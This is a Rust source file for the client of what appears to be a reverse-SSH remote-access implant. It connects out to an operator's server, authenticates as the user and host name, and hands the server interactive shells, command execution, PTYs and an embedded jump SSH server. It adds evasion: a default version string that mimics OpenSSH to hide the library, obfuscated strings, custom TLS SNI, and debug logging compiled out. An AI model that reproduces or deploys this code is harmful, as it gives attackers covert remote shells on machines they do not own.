use crate::cf::Config;
use crate::hd;
use russh::client::{self, ChannelOpenHandle, Handler, Msg, Session};
use russh::keys::PublicKeyBase64;
use russh::keys::PublicKeyOrCertificate;
use russh::{Channel, ChannelId, ChannelWriteHalf};
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::Mutex;

pub struct ClientHandler {
    pub fingerprint: String,
    pub key: Arc<russh::keys::PrivateKey>,
    pub sessions: Arc<
        Mutex<
            HashMap<
                ChannelId,
                Arc<hd::jp::SessionCtx<russh::client::Msg>>,
            >,
        >,
    >,
}

impl Handler for ClientHandler {
    type Error = russh::Error;

    async fn check_server_key(&mut self, key: &PublicKeyOrCertificate) -> Result<bool, Self::Error> {
        if self.fingerprint.is_empty() {
            return Ok(true);
        }
        let blob = match key {
            PublicKeyOrCertificate::PublicKey { key, .. } => key.public_key_bytes(),
            PublicKeyOrCertificate::Certificate(_) => return Ok(false),
        };
        let fp = crate::ky::hex(&Sha256::digest(blob));
        Ok(fp == self.fingerprint.to_lowercase())
    }

    async fn should_accept_unknown_server_channel(
        &mut self,
        _id: ChannelId,
        channel_type: &str,
    ) -> bool {
        channel_type == crate::ob!("jump")
    }

    async fn server_channel_open_unknown(
        &mut self,
        channel: Channel<Msg>,
        reply: ChannelOpenHandle,
        _session: &mut Session,
    ) -> Result<(), Self::Error> {
        // "jump" channel: in-process SSH server for the operator (ssh -J)
        let key = self.key.clone();
        reply.accept().await;
        tokio::spawn(async move {
            hd::jp::serve(channel, key).await;
        });
        Ok(())
    }

    // ---- control-connection session handling (reverse-ssh semantics) ----

    async fn server_channel_open_session(
        &mut self,
        channel: Channel<Msg>,
        reply: ChannelOpenHandle,
        _session: &mut Session,
    ) -> Result<(), Self::Error> {
        reply.accept().await;
        let (_reader, writer) = channel.split();
        let (stdin_tx, stdin_rx) = tokio::sync::mpsc::unbounded_channel();
        let ctx: Arc<hd::jp::SessionCtx<russh::client::Msg>> = Arc::new(
            hd::jp::SessionCtx {
                writer: Arc::new(writer),
                pty: std::sync::Mutex::new(None),
                stdin_tx,
                stdin_rx: tokio::sync::Mutex::new(Some(stdin_rx)),
            },
        );
        self.sessions.lock().await.insert(ctx.writer.id(), ctx);
        Ok(())
    }

    async fn data(
        &mut self,
        channel: ChannelId,
        data: &[u8],
        _session: &mut Session,
    ) -> Result<(), Self::Error> {
        let sessions = self.sessions.lock().await;
        if let Some(ctx) = sessions.get(&channel) {
            let _ = ctx.stdin_tx.send(data.to_vec());
        }
        Ok(())
    }

    async fn server_exec_request(
        &mut self,
        channel: ChannelId,
        wants_reply: bool,
        command: &str,
        session: &mut Session,
    ) -> Result<(), Self::Error> {
        let Some(ctx) = self.sessions.lock().await.get(&channel).cloned() else {
            if wants_reply {
                session.channel_failure(channel)?;
            }
            return Ok(());
        };
        if wants_reply {
            session.channel_success(channel)?;
        }
        let command = command.to_string();
        tokio::spawn(async move {
            hd::sx::run_exec(ctx, command).await;
        });
        Ok(())
    }

    async fn server_shell_request(
        &mut self,
        channel: ChannelId,
        wants_reply: bool,
        session: &mut Session,
    ) -> Result<(), Self::Error> {
        let Some(ctx) = self.sessions.lock().await.get(&channel).cloned() else {
            if wants_reply {
                session.channel_failure(channel)?;
            }
            return Ok(());
        };
        if wants_reply {
            session.channel_success(channel)?;
        }
        tokio::spawn(async move {
            hd::sx::run_shell(ctx).await;
        });
        Ok(())
    }

    async fn server_subsystem_request(
        &mut self,
        channel: ChannelId,
        wants_reply: bool,
        name: &str,
        session: &mut Session,
    ) -> Result<(), Self::Error> {
        let Some(ctx) = self.sessions.lock().await.get(&channel).cloned() else {
            if wants_reply {
                session.channel_failure(channel)?;
            }
            return Ok(());
        };
        if wants_reply {
            session.channel_success(channel)?;
        }
        let name = name.to_string();
        tokio::spawn(async move {
            hd::sx::run_subsystem(ctx, name).await;
        });
        Ok(())
    }

    async fn server_pty_request(
        &mut self,
        channel: ChannelId,
        wants_reply: bool,
        _term: &str,
        col_width: u32,
        row_height: u32,
        _pix_width: u32,
        _pix_height: u32,
        session: &mut Session,
    ) -> Result<(), Self::Error> {
        let sessions = self.sessions.lock().await;
        if let Some(ctx) = sessions.get(&channel) {
            let pty = hd::sx::PtyState::new(col_width, row_height);
            *ctx.pty.lock().unwrap() = Some(Arc::new(pty));
        }
        if wants_reply {
            session.channel_success(channel)?;
        }
        Ok(())
    }

    async fn server_window_change_request(
        &mut self,
        channel: ChannelId,
        col_width: u32,
        row_height: u32,
        _pix_width: u32,
        _pix_height: u32,
        _session: &mut Session,
    ) -> Result<(), Self::Error> {
        let sessions = self.sessions.lock().await;
        if let Some(ctx) = sessions.get(&channel) {
            if let Some(p) = ctx.pty.lock().unwrap().as_ref() {
                p.resize(col_width, row_height);
            }
        }
        Ok(())
    }

    async fn channel_eof(
        &mut self,
        channel: ChannelId,
        _session: &mut Session,
    ) -> Result<(), Self::Error> {
        let sessions = self.sessions.lock().await;
        if let Some(ctx) = sessions.get(&channel) {
            let _ = ctx.stdin_tx.send(Vec::new());
        }
        Ok(())
    }

    async fn channel_close(
        &mut self,
        channel: ChannelId,
        _session: &mut Session,
    ) -> Result<(), Self::Error> {
        self.sessions.lock().await.remove(&channel);
        Ok(())
    }
}

pub async fn connect_and_serve(cfg: &Arc<Config>) -> Result<(), String> {
    #[cfg(feature = "debug-log")]
    let dbg = |m: &str| eprintln!("[e] {m}");
    #[cfg(not(feature = "debug-log"))]
    let dbg = |m: &str| {
        let _ = m;
    };
    let (host, port, scheme) = split_addr(&cfg.addr);

    let mut config = client::Config::default();
    config.keepalive_interval = Some(std::time::Duration::from_secs(15));
    // default identification looks like a stock OpenSSH client instead of
    // leaking the library name; the -<os>_<arch> suffix follows the Go client
    // convention so the server can show the OS, and an explicit
    // --version-string still wins
    let os = match std::env::consts::OS {
        "macos" => "darwin",
        other => other,
    };
    let arch = match std::env::consts::ARCH {
        "x86_64" => "amd64",
        "aarch64" => "arm64",
        "i686" | "i386" => "386",
        other => other,
    };
    let base = crate::ob!("SSH-2.0-OpenSSH_9.6");
    // Standard appends the RFC \r\n terminator; Raw sends the buffer as-is
    // and breaks the server-side version line reader.
    config.client_id = russh::SshId::Standard(format!("{base}-{os}_{arch}").into());
    if !cfg.version_string.is_empty() {
        let mut ver = cfg.version_string.clone();
        if !ver.starts_with("SSH-") {
            ver = format!("SSH-{ver}");
        }
        config.client_id = russh::SshId::Raw(ver.into());
    }

    let key = crate::ky::load()?;
    let handler = ClientHandler {
        fingerprint: cfg.fingerprint.clone(),
        key,
        sessions: Arc::new(Mutex::new(HashMap::new())),
    };

    // Transport: plain TCP or TLS (tls:// scheme), like the Go client.
    trait NetStream: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin + Send {}
    impl<T> NetStream for T where T: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin + Send {}
    let stream: Box<dyn NetStream> = match scheme {
        "tls" | "wss" | "https" => {
            let sni = cfg.sni.clone().unwrap_or_else(|| host.clone());
            Box::new(crate::tl::connect(&host, port, &sni).await.map_err(|e| format!("tls: {e}"))?)
        }
        _ => Box::new(
            tokio::net::TcpStream::connect((host.as_str(), port))
                .await
                .map_err(|e| format!("tcp: {e}"))?,
        ),
    };

    let mut handle = client::connect_stream(Arc::new(config), stream, handler)
        .await
        .map_err(|e| format!("connect: {e}"))?;
    dbg("transport + kex ok");

    // username mirrors the Go client: user.hostname
    let user = format!("{}.{}", crate::sy::username(), crate::sy::hostname());

    let auth_key = crate::ky::load()?;
    let authed = handle
        .authenticate_publickey(user, crate::ky::with_hash_alg(auth_key))
        .await
        .map_err(|e| format!("auth: {e}"))?;

    if !matches!(authed, russh::client::AuthResult::Success) {
        return Err("authentication rejected".into());
    }
    dbg("auth ok, serving");

    // Wait for the session task to end (disconnect etc.)
    let r = handle.await.map_err(|e| format!("session: {e}"));
    dbg("session ended");
    r
}

pub fn split_addr(addr: &str) -> (String, u16, &'static str) {
    let (scheme, rest) = match addr.find("://") {
        Some(i) => (&addr[..i], &addr[i + 3..]),
        None => ("", addr),
    };
    let default_port: u16 = match scheme {
        "tls" | "wss" | "https" => 443,
        "ws" | "http" => 80,
        _ => 22,
    };
    let scheme_static: &'static str = match scheme {
        "tls" | "wss" | "https" => "tls",
        "ws" | "http" => "http",
        _ => "ssh",
    };
    match rest.rsplit_once(':') {
        Some((h, p)) => (h.to_string(), p.parse().unwrap_or(default_port), scheme_static),
        None => (rest.to_string(), default_port, scheme_static),
    }
}
